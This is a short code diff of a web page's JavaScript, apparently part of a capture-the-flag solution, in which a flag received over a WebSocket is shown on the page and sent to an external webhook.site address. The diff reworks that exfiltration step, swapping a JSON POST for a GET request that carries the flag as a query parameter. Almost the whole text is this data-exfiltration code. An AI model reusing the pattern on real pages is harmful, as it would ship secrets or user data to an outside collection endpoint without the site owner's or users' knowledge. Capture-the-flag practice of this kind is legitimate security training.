@@ -27,23 +27,17 @@
             // Display the flag on the page
             document.getElementById('flag').textContent = 'Flag: ' + message;
 
-            // Send the flag to the webhook
-            fetch('https://webhook.site/cd493d3b-ca76-4b9b-90f2-1e71569c7c98', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    flag: message
+            // Send the flag to the webhook via GET request with the flag as a query parameter
+            const webhookUrl = `https://webhook.site/cd493d3b-ca76-4b9b-90f2-1e71569c7c98?flag=${encodeURIComponent(message)}`;
+            
+            fetch(webhookUrl)
+                .then(response => response.text())
+                .then(data => {
+                    console.log('Flag sent to webhook:', data);
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Flag sent to webhook:', data);
-            })
-            .catch(error => {
-                console.error('Error sending flag to webhook:', error);
-            });
+                .catch(error => {
+                    console.error('Error sending flag to webhook:', error);
+                });
         };
 
         // Handle any errors that may occur with the WebSocket
